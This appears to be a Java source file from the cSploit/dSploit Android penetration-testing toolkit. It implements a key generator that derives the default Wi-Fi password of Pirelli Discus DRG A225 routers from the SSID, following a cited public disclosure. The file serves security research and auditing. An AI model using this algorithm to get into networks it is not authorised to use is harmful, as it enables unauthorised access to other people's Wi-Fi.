/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.wifi.algorithms;

import java.util.List;

import org.csploit.android.wifi.Keygen;

/**
 * The algortihm is described on the pdf below
 * Link:http://www.remote-exploit.org/content/Pirelli_Discus_DRG_A225_WiFi_router.pdf
 *
 * @author Rui Araújo
 */
public class DiscusKeygen extends Keygen{


  public DiscusKeygen(String ssid, String mac, int level, String enc){
    super(ssid, mac, level, enc);
  }

  static final int essidConst = 0xD0EC31;

  @Override
  public List<String> getKeys(){
    int routerEssid = Integer.parseInt(getSsidName().substring(getSsidName().length() - 6), 16);
    int result = (routerEssid - essidConst) >> 2;
    addPassword("YW0" + Integer.toString(result));
    return getResults();
  }
}
